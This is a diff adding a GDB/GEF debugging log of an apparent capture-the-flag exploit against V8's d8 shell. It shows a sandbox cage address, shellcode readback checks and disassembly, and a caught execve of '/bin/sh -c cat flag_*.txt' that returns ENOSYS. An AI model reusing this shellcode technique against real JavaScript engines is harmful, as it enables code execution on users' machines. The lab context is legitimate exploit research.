@@ -1,0 +1,137 @@
+Loading GEF...
+[32mGEF[0m is ready, type '[4m[33mgef[0m' to start, '[4m[35mgef config[0m' to configure
+Loaded [1m[32m494[0m commands (+[1m[32m130[0m aliases) for GDB [1m[33m17.1[0m using Python engine [1m[31m3.14[0m
+[1m[34m[+][0m Could not find /home/folly/.gef.rc, GEF uses default settings
+Catchpoint 1 (syscall 'execve' [59])
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7ffff7bff6c0 (LWP 1347231)]
+[New Thread 0x7ffff73fe6c0 (LWP 1347232)]
+[New Thread 0x7ffff6bfd6c0 (LWP 1347233)]
+[New Thread 0x7ffff63fc6c0 (LWP 1347234)]
+[New Thread 0x7ffff5bfb6c0 (LWP 1347235)]
+[New Thread 0x7ffff53fa6c0 (LWP 1347236)]
+[New Thread 0x7ffff4bf96c0 (LWP 1347237)]
+[New Thread 0x7ffff43f86c0 (LWP 1347238)]
+[New Thread 0x7ffff3bf76c0 (LWP 1347239)]
+[New Thread 0x7ffff33f66c0 (LWP 1347240)]
+[New Thread 0x7ffff2bf56c0 (LWP 1347241)]
+[New Thread 0x7ffff23f46c0 (LWP 1347242)]
+[New Thread 0x7ffff1bf36c0 (LWP 1347243)]
+[New Thread 0x7ffff13f26c0 (LWP 1347244)]
+[New Thread 0x7ffff0bf16c0 (LWP 1347245)]
+[New Thread 0x7ffff03f06c0 (LWP 1347246)]
+[New Thread 0x7fffefbef6c0 (LWP 1347247)]
+[New Thread 0x7fffef3ee6c0 (LWP 1347248)]
+[New Thread 0x7fffeebed6c0 (LWP 1347249)]
+[New Thread 0x7fffee3ec6c0 (LWP 1347250)]
+[New Thread 0x7fffedbeb6c0 (LWP 1347251)]
+[New Thread 0x7fffed3ea6c0 (LWP 1347252)]
+[New Thread 0x7fffecbe96c0 (LWP 1347253)]
+[New Thread 0x7fffec3e86c0 (LWP 1347254)]
+[New Thread 0x7fffebbe76c0 (LWP 1347255)]
+[New Thread 0x7fffeb3e66c0 (LWP 1347256)]
+[New Thread 0x7fffeabe56c0 (LWP 1347257)]
+[New Thread 0x7fffea3e46c0 (LWP 1347258)]
+[New Thread 0x7fffe9be36c0 (LWP 1347259)]
+[New Thread 0x7fffe93e26c0 (LWP 1347260)]
+[New Thread 0x7fffe8be16c0 (LWP 1347261)]
+[New Thread 0x7fffe83e06c0 (LWP 1347262)]
+[New Thread 0x7fffe7bdf6c0 (LWP 1347263)]
+[New Thread 0x7fffe73de6c0 (LWP 1347264)]
+[New Thread 0x7fffe6bdd6c0 (LWP 1347265)]
+[New Thread 0x7fffe63dc6c0 (LWP 1347266)]
+[New Thread 0x7fffe5bdb6c0 (LWP 1347267)]
+[New Thread 0x7fffe53da6c0 (LWP 1347268)]
+[New Thread 0x7fffe4bd96c0 (LWP 1347269)]
+[New Thread 0x7fffe43d86c0 (LWP 1347270)]
+[New Thread 0x7fffe3bd76c0 (LWP 1347271)]
+[New Thread 0x7fffe33d66c0 (LWP 1347272)]
+[New Thread 0x7fffe2bd56c0 (LWP 1347273)]
+[New Thread 0x7fffe23d46c0 (LWP 1347274)]
+[New Thread 0x7fffe1bd36c0 (LWP 1347275)]
+[New Thread 0x7fffe13d26c0 (LWP 1347276)]
+[New Thread 0x7fffe0bd16c0 (LWP 1347277)]
+[New Thread 0x7fffe03d06c0 (LWP 1347278)]
+cage=0x115400000000 inst=0x11540101910c td=0x11540104087c jump_table=0x000028fdbf98a000
+sc[0] readback = 0xb848d231fa1e0ff3 (want 0xb848d231fa1e0ff3)
+sc[10] readback = 0x050fff310000003c (want 0x90909090050fff)
+calling wf()...
+
+Thread 1 "d8" hit Catchpoint 1 (call to syscall execve), 0x000028fdbf98a04f in ?? ()
+[H[2J[ Legend: [1m[31mModified register[0m | [31mCode[0m | [94mHeap[0m | [35mStack[0m | [32mWritable[0m | [38;2;255;255;255mReadOnly[0m | [90mNone[0m | [4mRWX[0m | [33mString[0m ]
+[36m------------------------------------------------------------------------------------- [0m[36mregisters[0m[36m ----[0m
+[34m$rax[0m: 0xffffffffffffffda
+[1m[31m$rbx[0m: [35m0x00007fffffffd2c8[0m  ->  [32m0x0000115401002d39[0m  ->  0xbd00163676010161
+[1m[31m$rcx[0m: [31m[4m0x000028fdbf98a04f[0m  ->  0x0fff310000003cb8
+[1m[31m$rdx[0m: 0x0000000000000000
+[1m[31m$rsp[0m: [35m0x00007fffffffd050[0m  ->  [35m0x00007fffffffd088[0m  ->  0x0068732f6e69622f ([33m'/bin/sh'[0m?)
+[1m[31m$rbp[0m: [35m0x00007fffffffd0c0[0m  ->  [35m0x00007fffffffd2b8[0m  ->  [35m0x00007fffffffd370[0m  ->  [35m0x00007fffffffd398[0m  ->  ...
+[1m[31m$rsi[0m: [35m0x00007fffffffd050[0m  ->  [35m0x00007fffffffd088[0m  ->  0x0068732f6e69622f ([33m'/bin/sh'[0m?)
+[1m[31m$rdi[0m: [32m0x00007fffc7bd0000[0m  ->  [31m[4m0x000028fdbf98a000[0m  ->  0xb848d231fa1e0ff3
+[1m[31m$rip[0m: [31m[4m0x000028fdbf98a04f[0m  ->  0x0fff310000003cb8
+[1m[31m$r8 [0m: [35m0x00007fffffffd1c8[0m  ->  [31m0x0000555556cfb689[0m <v8::internal::(anonymous namespace)::ConsoleCall(v8::internal::Isolate*, v8::internal::BuiltinArguments const&, void (v8::debug::ConsoleDelegate::*)(v8::debug::ConsoleCallArguments const&, v8::debug::ConsoleContext const&))+0x159>  ->  0x74c0758b4cdb8548
+[1m[31m$r9 [0m: 0x0000000000000001
+[1m[31m$r10[0m: [32m0x00007fffc7bd0000[0m  ->  [31m[4m0x000028fdbf98a000[0m  ->  0xb848d231fa1e0ff3
+[1m[31m$r11[0m: 0x0000000000000246
+[1m[31m$r12[0m: [35m0x00007fffffffd221[0m  ->  0x8000001154010401
+[1m[31m$r13[0m: [35m0x00007fffffffd088[0m  ->  0x0068732f6e69622f ([33m'/bin/sh'[0m?)
+[1m[31m$r14[0m: [35m0x00007fffffffd080[0m  ->  0x000000000000632d ([33m'-c'[0m?)
+[1m[31m$r15[0m: [35m0x00007fffffffd070[0m  ->  0x67616c6620746163 [33m'cat flag_*.txt'[0m
+[34m$fs_base[0m: [32m0x00007ffff7e3f940[0m  ->  [loop detected]
+[34m$gs_base[0m: 0x0000000000000000
+[1m[31m$eflags[0m: 0x246 [ident align vx86 resume nested overflow direction [1mINTERRUPT[0m trap sign [1mZERO[0m adjust [1mPARITY[0m carry] [Ring=3]
+[34m$cs[0m: 0x0033 [34m$ss[0m: 0x002b [34m$ds[0m: 0x0000 [34m$es[0m: 0x0000 [34m$fs[0m: 0x0000 [34m$gs[0m: 0x0000
+$rax: -38 ENOSYS (Invalid system call number)
+[36m----------------------------------------------------------------------------------------- [0m[36mstack[0m[36m ----[0m
+$rsp+ [36m0x7fffffffd050[0m|+0x0000|+000: [35m0x00007fffffffd088[0m  ->  0x0068732f6e69622f ([33m'/bin/sh'[0m?)[1m[34m  <-  retaddr[1], $r13[0m
+      [36m0x7fffffffd058[0m|+0x0008|+001: [35m0x00007fffffffd080[0m  ->  0x000000000000632d ([33m'-c'[0m?)[1m[34m  <-  retaddr[2], $r14[0m
+      [36m0x7fffffffd060[0m|+0x0010|+002: [35m0x00007fffffffd070[0m  ->  0x67616c6620746163 [33m'cat flag_*.txt'[0m[1m[34m  <-  retaddr[3], $r15[0m
+      [36m0x7fffffffd068[0m|+0x0018|+003: 0x0000000000000000
+$r15  [36m0x7fffffffd070[0m|+0x0020|+004: 0x67616c6620746163 [33m'cat flag_*.txt'[0m
+      [36m0x7fffffffd078[0m|+0x0028|+005: 0x00007478742e2a5f ([33m'_*.txt'[0m?)
+$r14  [36m0x7fffffffd080[0m|+0x0030|+006: 0x000000000000632d ([33m'-c'[0m?)
+$r13  [36m0x7fffffffd088[0m|+0x0038|+007: 0x0068732f6e69622f ([33m'/bin/sh'[0m?)
+[36m--------------------------------------------------------------------- [0m[36mcode: x86:64 (gdb-native)[0m[36m ----[0m
+    [90m0x28fdbf98a045 4c89d7                <NO_SYMBOL>   mov    rdi, r10[0m
+    [90m0x28fdbf98a048 b83b000000            <NO_SYMBOL>   mov    eax, 0x3b[0m
+    [90m0x28fdbf98a04d 0f05                  <NO_SYMBOL>   syscall[0m
+ -> [1m[32m0x28fdbf98a04f[0m [1m[38;2;255;255;255mb83c000000          [0m [1m[32m <NO_SYMBOL>[0m   [1m[93mmov   [0m [1m[36meax[0m[1m[38;2;255;255;255m, [0m[1m[94m0x3c[0m
+    0x28fdbf98a054 [38;2;255;255;255m31ff                [0m  <NO_SYMBOL>   [33mxor   [0m [36medi[0m[38;2;255;255;255m, [0m[36medi[0m
+    0x28fdbf98a056 [38;2;255;255;255m0f05                [0m  <NO_SYMBOL>   [1m[93msyscall[0m
+    0x28fdbf98a058 [38;2;255;255;255mc0f33b              [0m  <NO_SYMBOL>   [33mshl   [0m [36mbl[0m[38;2;255;255;255m, [0m[94m0x3b[0m
+    0x28fdbf98a05b [38;2;255;255;255m58                  [0m  <NO_SYMBOL>   [33mpop   [0m [36mrax[0m
+    0x28fdbf98a05c [38;2;255;255;255m55                  [0m  <NO_SYMBOL>   [33mpush  [0m [36mrbp[0m
+[36m-------------------------------------------------------------------- [0m[36mthreads (shown:4 / all:49)[0m[36m ----[0m
+[*[1m[32mThread Id:1, tid:1347228[0m] Name: "d8", [1m[31mstopped[0m at [31m[4m0x28fdbf98a04f[0m <NO_SYMBOL>, reason: [1m[35mBREAKPOINT[0m
+[ [1m[35mThread Id:2, tid:1347231[0m] Name: "V8 DefaultWorke", [1m[31mstopped[0m at [31m0x7ffff7d34a8d[0m <syscall+0x1d>, reason: [1m[35mSTOPPED[0m
+[ [1m[35mThread Id:3, tid:1347232[0m] Name: "V8 DefaultWorke", [1m[31mstopped[0m at [31m0x7ffff7d34a8d[0m <syscall+0x1d>, reason: [1m[35mSTOPPED[0m
+[ [1m[35mThread Id:4, tid:1347233[0m] Name: "V8 DefaultWorke", [1m[31mstopped[0m at [31m0x7ffff7d34a8d[0m <syscall+0x1d>, reason: [1m[35mSTOPPED[0m
+[36m----------------------------------------------------------------------------------------- [0m[36mtrace[0m[36m ----[0m
+[*[1m[32m#0[0m] [31m[4m0x28fdbf98a04f[0m <NO_SYMBOL>
+[ [1m[35m#1[0m] [35m0x7fffffffd088[0m <NO_SYMBOL>
+[ [1m[35m#2[0m] [35m0x7fffffffd080[0m <NO_SYMBOL>
+[ [1m[35m#3[0m] [35m0x7fffffffd070[0m <NO_SYMBOL>
+[ [1m[35m#4[0m] 0x000000000000 <NO_SYMBOL>
+[36m----------------------------------------------------------------------------------------------------[0m
+=== CAUGHT EXECVE ===
+rip            0x28fdbf98a04f      0x28fdbf98a04f
+rsp            0x7fffffffd050      0x7fffffffd050
+rax            0xffffffffffffffda  0xffffffffffffffda
+rdi            0x7fffc7bd0000      0x7fffc7bd0000
+rsi            0x7fffffffd050      0x7fffffffd050
+rdx            0x0                 0x0
+r13            0x7fffffffd088      0x7fffffffd088
+r14            0x7fffffffd080      0x7fffffffd080
+r15            0x7fffffffd070      0x7fffffffd070
+path str: 0x7fffc7bd0000:	""
+argv[0] ptr: 0x7fffffffd050:	0x00007fffffffd088
+argv[0] str: 0x7fffffffd088:	"/bin/sh"
+argv[1] str: 0x7fffffffd080:	"-c"
+argv[2] str: 0x7fffffffd070:	"cat flag_*.txt"
+stack top: 0x7fffffffd050:	0x00007fffffffd088	0x00007fffffffd080
+0x7fffffffd060:	0x00007fffffffd070	0x0000000000000000
+0x7fffffffd070:	0x67616c6620746163	0x00007478742e2a5f
+shellcode at r13-32: 0x7fffffffd068:	0x0000000000000000	0x67616c6620746163
+0x7fffffffd078:	0x00007478742e2a5f	0x000000000000632d
+GDBEXIT=0
